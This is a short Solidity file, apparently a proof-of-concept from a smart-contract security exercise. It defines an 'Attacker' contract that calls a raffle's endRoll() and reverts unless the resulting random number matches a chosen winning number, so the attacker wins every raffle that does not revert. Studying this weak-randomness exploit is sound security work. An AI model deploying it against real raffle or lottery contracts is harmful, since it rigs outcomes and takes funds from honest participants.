// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./RaffleContract.sol";

contract Attacker {
    RaffleContract private _raffle;

    constructor() {}

    function setRaffleContract(RaffleContract raffle) public {
        _raffle = raffle;
    }

    function attack(uint256 winningNumber) public {
        _raffle.endRoll();
        if (_raffle.randomNumber() != winningNumber) {
            revert();
        }
    }
}
